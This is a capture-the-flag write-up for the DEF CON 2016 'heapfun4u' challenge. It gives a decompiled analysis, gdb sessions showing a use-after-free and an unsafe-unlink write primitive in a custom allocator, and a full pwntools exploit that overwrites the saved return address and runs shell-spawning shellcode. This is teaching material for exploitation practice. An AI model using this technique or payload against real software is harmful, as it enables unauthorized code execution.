---
title: "Baby's First) heapfun4u"
sidebar_position: 1
---
## **Information**

### **Description**
```
Guess what, it is a heap bug.

[file](http://download.quals.shallweplayaga.me/873c6d81dd688c9057d5b229cf80579e/heapfun4u)

heapfun4u\_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me:3957
```
### **File**

* [heapfun4u](/attachments/1147021/1147020.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2016/tree/master/heapfun4u>

## **Writeup**

### File information

```
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$ file heapfun4u
heapfun4u: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b019e6cbed93d55ebef500e8c4dec79ce592fa42, stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$ checksec --file heapfun4u
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No  0       3   heapfun4u
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$
```

* Running the program outputs the following:

```
lazenca0x0@ubuntu:~/CTF/DEFCON2016/baby's/heap4fun$ ./heapfun4u 
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
|
```

### **Binary analysis**

#### **Main**

* This function performs the following operations:
  + Initializes the gArray region to '0' using the memset() function.
  + If user input is 'A':  
    - First checks whether the value of gCount is 100.
      * If this value is 100, the program exits.
      * This variable tracks the count of allocated buffers.
    - Reads the size of the buffer to create from the user using read().
      * This value is passed as an argument to AllocateBuffer().
      * AllocateBuffer() allocates heap memory of the requested size and returns its address.
      * The allocated heap address is stored in gArray[count].
      * The size of the allocated heap area is stored in gArraySize[count].
  + If user input is 'F':  
    - Calls the PrintArray() function.
      * This function prints all values stored in gArray and gArraySize.
    - Reads the index of the buffer to free from the user using read().
      * The input value is passed to FreeBuffer() as follows:
      * Ex) FreeBuffer(gArray[entered index])
      * In other words, it passes the heap address stored in gArray[].
  + If user input is 'N':
    - Calls the NiceGuy() function.
  + If user input is 'W':  
    - Calls the WriteBuffer() function.

```c title="__main__"
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rsi@1
  int count; // ebx@9
  __int64 result; // rax@22
  char buf; // [rsp+0h] [rbp-120h]@2
  int size; // [rsp+10Ch] [rbp-14h]@1

  memset(gArray, 0, 800uLL);
  gCount = 0;
  size = 0;
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = 0LL;
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( 1 )
  {
    puts("[A]llocate Buffer");
    puts("[F]ree Buffer");
    puts("[W]rite Buffer");
    puts("[N]ice guy");
    puts("[E]xit");
    printf("| ", v3);
    v3 = &buf;
    if ( read(0, &buf, 0xFFuLL) <= 0 )
      break;
    switch ( buf )
    {
      case 'A':
        if ( gCount == 100 )
          exit(0);
        printf("Size: ", &buf);
        v3 = &buf;
        if ( read(0, &buf, 0xFFuLL) <= 0 )
          exit(0);
        size = atoi(&buf);
        count = gCount;
        gArray[count] = (void *)AllocateBuffer(size);
        gArraySize[gCount] = size;
        if ( !gArray[gCount] )
          exit(0);
        ++gCount;
        break;
      case 'E':
        puts("Leave");
        return 0LL;
      case 'F':
        PrintArray();
        printf("Index: ", &buf);
        v3 = &buf;
        if ( read(0, &buf, 0x100uLL) <= 0 )
          exit(0);
        size = atoi(&buf) - 1;
        if ( size < 0 || size > 99 )
          exit(0);
        if ( !gArray[size] )
          exit(0);
        FreeBuffer((__int64)gArray[size]);
        break;
      case 'N':
        NiceGuy();
        break;
      case 'W':
        WriteBuffer();
        break;
      default:
        exit(0);
        return result;
    }
  }
  exit(0);
  return result;
}
```

#### **PrintArray**

* This function performs the following operations:
  + Prints the information stored in gArray[] and gArraySize[].

```c title="PrintArray"
int PrintArray()
{
  void *addresss; // rax@2
  signed int i; // [rsp+Ch] [rbp-4h]@1

  for ( i = 0; i <= 99; ++i )
  {
    addresss = gArray[i];
    if ( addresss )
      LODWORD(addresss) = printf("%d) %p -- %d\n", (unsigned int)(i + 1), gArray[i], (unsigned int)gArraySize[i]);
  }
  return (signed int)addresss;
}
```

#### **NiceGuy**

* This function performs the following operations:
  + Declares a char variable and prints its address (stack address leak).

```c title="NiceGuy"
int NiceGuy()
{
  char v1; // [rsp+Ch] [rbp-4h]@1
  return printf("Here you go: %p\n", &v1);
}
```

#### **WriteBuffer**

* This function performs the following operations:
  + Prints allocated buffer information using PrintArray().
  + Reads the index of the buffer to write to from the user using read().
  + Reads user data and writes it to the designated buffer.

```c title="WriteBuffer"
ssize_t WriteBuffer()
{
  ssize_t result; // rax@8
  char buf; // [rsp+0h] [rbp-20h]@1
  int location; // [rsp+1Ch] [rbp-4h]@1

  location = 0;
  PrintArray();
  printf("Write where: ");
  if ( read(0, &buf, 15uLL) <= 0 )
    exit(0);
  location = atoi(&buf) - 1;
  if ( location < 0 || location > 99 )
    exit(0);
  if ( !gArray[location] )
    exit(0);
  printf("Write what: ", &buf);
  result = read(0, gArray[location], gArraySize[location]);
  if ( result <= 0 )
    exit(0);
  return result;
}
```

### Debugging

#### **AllocateBuffer / FreeBuffer**

* Set breakpoints as follows:

```c title="Breakpoint"
gdb-peda$ b *0x0400A6E
Breakpoint 1 at 0x400a6e
gdb-peda$ b *0x0400B4E
Breakpoint 2 at 0x400b4e
gdb-peda$
```

* Allocate memory using AllocateBuffer as follows:
  + Examining the allocated memory region reveals that it resembles custom heap chunks.

```c title="gdb-peda"
gdb-peda$ r
Starting program: /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u 
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer  
[N]ice guy
[E]xit
| A
Size: 16

Breakpoint 1, 0x0000000000400a6e in ?? ()
gdb-peda$ i r rax
rax            0x7ffff7ff5008	0x7ffff7ff5008
gdb-peda$ x/6gx 0x7ffff7ff5008 
0x7ffff7ff5008:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5018:	0x0000000000000fe0	0x0000000000000000
0x7ffff7ff5028:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/6gx 0x7ffff7ff5008 - 0x8 
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000fe0
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* However, checking the process memory map shows that this is an mmap-allocated region rather than the standard Heap or Stack.

```c title="info proc map"
gdb-peda$ info proc map
process 56985
Mapped addresss spaces:
          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u
      0x7ffff7a15000     0x7ffff7bcf000   0x1ba000        0x0 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x1ba000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x1ba000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x1be000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dd5000     0x7ffff7dda000     0x5000        0x0 
      0x7ffff7dda000     0x7ffff7dfd000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7fdb000     0x7ffff7fde000     0x3000        0x0 
      0x7ffff7ff5000     0x7ffff7ff6000     0x1000        0x0 
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x22000 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$
```

#### **Check for UAF (Use After Free)**

* Let's check whether a UAF vulnerability occurs using the provided functionality.
* Allocate additional buffers as follows:
  + Size: 64
  + Size: 16

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| A
Size: 64
Breakpoint 1, 0x0000000000400a6e in ?? ()
gdb-peda$ c
Continuing.

...
Size: 16

Breakpoint 1, 0x0000000000400a6e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8 
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000043
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$
```

* Then free the allocated buffers as follows:

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| F
1) 0x7ffff7ff5008 -- 16
2) 0x7ffff7ff5020 -- 64
3) 0x7ffff7ff5068 -- 16
Index: 2
Breakpoint 2, 0x0000000000400b4e in ?? ()
gdb-peda$ c
Continuing.

...
Index: 1

Breakpoint 2, 0x0000000000400b4e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8 
0x7ffff7ff5000:	0x000000000000005b	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$
```

* Next, allocate a buffer of size 64:
  + The address of the buffer created by AllocateBuffer is 0x7ffff7ff5008.
  + This address is identical to the first allocated buffer.

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| A
Size: 64

Breakpoint 1, 0x0000000000400a6e in ?? ()
gdb-peda$ i r rax
rax            0x7ffff7ff5008	0x7ffff7ff5008
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8 
0x7ffff7ff5000:	0x000000000000005b	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$
```

* In addition, the program does not remove freed buffer pointers from the list.
  + Because of this, buffers freed via "FreeBuffer" can still be written to.
* This constitutes a Use-After-Free (UAF) vulnerability.

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| W
1) 0x7ffff7ff5008 -- 16
2) 0x7ffff7ff5020 -- 64
3) 0x7ffff7ff5068 -- 16
4) 0x7ffff7ff5008 -- 64
Write where:
```

#### **Check for unsafe unlink**

* First, allocate buffers of the following sizes:
  + 16, 64, 16
* Below is the memory structure of the allocated buffers:
  + The critical value is stored at 0x7ffff7ff5ff8.

```c title="gdb-peda"
gdb-peda$ b *0x0400B4E
Breakpoint 1 at 0x400b4e
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000043
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$ p/x 0x7ffff7ff5078 + 0x0000000000000f80
$18 = 0x7ffff7ff5ff8
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x0000000000000000
```

* When the second buffer is freed, the address of the second buffer's chunk size (0x00007ffff7ff5018) is written to 0x7ffff7ff5ff8:

```c title="gdb-peda"
Breakpoint 1, 0x0000000000400b4e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x00007ffff7ff5018
gdb-peda$
```

* Subsequently, when the first buffer is freed, the address of the first buffer's chunk size (0x00007ffff7ff5000) is stored in the 0x7ffff7ff5ff8 area:

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| F
1) 0x7ffff7ff5008 -- 16
2) 0x7ffff7ff5020 -- 64
3) 0x7ffff7ff5068 -- 16
Index: 1
Breakpoint 1, 0x0000000000400b4e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x000000000000005b	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x00007ffff7ff5000
gdb-peda$
```

* The location where the chunk size address is stored is calculated as follows:
  + Forward Pointer address (0x7ffff7ff5078) + value stored at Forward Pointer (0x0f80) = 0x7ffff7ff5ff8
  + In other words, the value stored at the Forward Pointer determines the target destination address where the chunk size address will be written.
  + Using this vulnerability, we can write the start address of a freed buffer to any arbitrary address.

#### **PoC (unsafe unlink)**

* We can verify unsafe unlink as follows:
  + Change the Top chunk value from 0xf80 to 0xfa0.
  + Then free the first buffer.

```c title="gdb-peda"
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000043
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000f80

gdb-peda$ set {int}0x7ffff7ff5078 = 4000
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000fa0

gdb-peda$ p/x 0x7ffff7ff5078 + 0x0000000000000fa0
$27 = 0x7ffff7ff6018
gdb-peda$ x/gx 0x7ffff7ff6018
0x7ffff7ff6018:	0x00007ffff7df59c0
gdb-peda$ p/x 0x7ffff7ff5078 + 0x0000000000000f80
$26 = 0x7ffff7ff5ff8
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x00007ffff7ff5018
gdb-peda$
```

* Modifying the Top chunk value causes the starting address of the freed buffer to be written to 0x7ffff7ff6018 instead of 0x7ffff7ff5ff8:

```c title="gdb-peda"
gdb-peda$ c
Continuing.
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| F
1) 0x7ffff7ff5008 -- 16
2) 0x7ffff7ff5020 -- 64
3) 0x7ffff7ff5068 -- 16
Index: 1
Breakpoint 1, 0x0000000000400b4e in ?? ()
gdb-peda$ x/16gx 0x7ffff7ff5008 - 0x8
0x7ffff7ff5000:	0x000000000000005b	0x0000000000000000
0x7ffff7ff5010:	0x0000000000000000	0x0000000000000042
0x7ffff7ff5020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff5050:	0x00007ffff7ff5078	0x0000000000000000
0x7ffff7ff5060:	0x0000000000000013	0x0000000000000000
0x7ffff7ff5070:	0x0000000000000000	0x0000000000000fa0
gdb-peda$ x/gx 0x7ffff7ff5ff8
0x7ffff7ff5ff8:	0x00007ffff7ff5018
gdb-peda$ x/gx 0x7ffff7ff6018
0x7ffff7ff6018:	0x00007ffff7ff5000
gdb-peda$
```

### Structure of Exploit code

:::note [Description]
1. Set up a memory layout to trigger the unsafe unlink vulnerability:
   1. First allocation: allocate minimum size (16).
   2. Second allocation: allocate space (128) to hold a fake chunk.
   3. Third allocation: allocate minimum size (16).
2. Create UAF condition:
   1. Free the second buffer, then free the first buffer.
   2. Allocate a fourth buffer (128) to store the fake chunk.
3. Write the fake chunk into the fourth buffer to trigger unsafe unlink:
   1. Construct and store a fake chunk with the following structure:
   2. `p64(rip offset) + p64(0) + p64(Fake buffer size) + p64(fill fake buffer) + p64(fake free chunk size) + p64(forward pointer) + p64(backward pointer)`
4. Trigger unsafe unlink:
   1. Free the second buffer.
      1. Unsafe unlink overwrites the RIP (saved return address) location on the stack with the address where the second buffer's chunk size is stored.
5. Store shellcode in the 4th buffer.
6. Exit the program to trigger code execution.
:::

* The following information is required for an attack:

:::note[Check point]
* RIP Offset
:::

### **Information for attack**

#### **RIP Offset**

* The RIP offset can be obtained as follows:
  + Call the "Nice guy" function to obtain the stack base leak address (0x7fffffffe19c).
  + When the program exits, the RSP register address used by the ret instruction is 0x7fffffffe2d8.
  + 0x7fffffffe2d8 - 0x7fffffffe19c = 0x13c

```c title="gdb-peda"
gdb-peda$ r
Starting program: /home/lazenca0x0/Documents/CTF/DEFCON2016/Baby's/heapfun4u/heapfun4u 
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| N
Here you go: 0x7fffffffe19c
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| E
Leave
Breakpoint 1, 0x0000000000400b96 in ?? ()
gdb-peda$ i r rsp
rsp            0x7fffffffe2d8	0x7fffffffe2d8
gdb-peda$ p/x 0x7fffffffe2d8 - 0x7fffffffe19c
$1 = 0x13c
```

## **Exploit Code**

```python title="exploit.py"
from pwn import *

p = process('./heapfun4u')

def niceguy():
    p.recv()
    p.sendline('N')
    p.recvuntil(": ")
    addr = p.recvuntil("\n")
    return int(addr, 16)

def allocate(size):
    p.recv()
    p.sendline('A')
    p.recv()
    p.sendline(size)

def free(num):
    p.recv()
    p.sendline('F')
    p.recv()
    p.sendline(num)

def write(num,data):
    p.recv()
    p.sendline('W')
    addr_list = p.recv()
    target_addr = 0
    for line in addr_list.split('\n'):
        if line[0] == num:
            target_addr = int(line.split()[1], 16)
    p.sendline(num)
    p.recv()
    p.sendline(data)
    return target_addr

def exit():
    p.recv()
    p.sendline('E')

base_addr = niceguy()
rip_addr = base_addr + 316

log.info('base_addr: {}'.format(hex(base_addr)))
log.info('rip_addr : {}'.format(hex(rip_addr)))

#UAF
allocate('16')
allocate('104')
allocate('16')
free('2')
free('1')

#Leak Addresss
allocate('128')
second_buffer_addr = write('4','A')

rip_offset = rip_addr - second_buffer_addr 
log.info('save_offset_addr : {}'.format(hex(second_buffer_addr)))
log.info('rip_offset : {}'.format(hex(rip_offset)))

rip_payload = p64(rip_offset)			# rip offset
rip_payload += p64(0)					#
rip_payload += p64(16 + 2 + 1)			# fake buffer size
rip_payload += 'AAAAAAAA' * 2			# fill fake buffer
rip_payload += p64(16 + 2)				# fake freed buffer size
rip_payload += p64(second_buffer_addr)	# forward pointer
rip_payload += p64(0)					# backward pointer
write('4',rip_payload)
free('2')

payload = 'AAAA' * 4
payload += asm(shellcraft.amd64.sh(),arch="amd64")
write('4',payload)
exit()

p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | The flag is: Oh noze you pwned my h33p. |

## **Related Site**

* <https://0xabe.io/ctf/exploit/2016/05/23/DEFCONCTF-heapfun4u.html>
* <https://gist.github.com/zachriggle/692342471645b1a25414561493a51357>
* <https://blahcat.github.io/2016/05/24/defcon-ctf-2016-heapfun4u/>
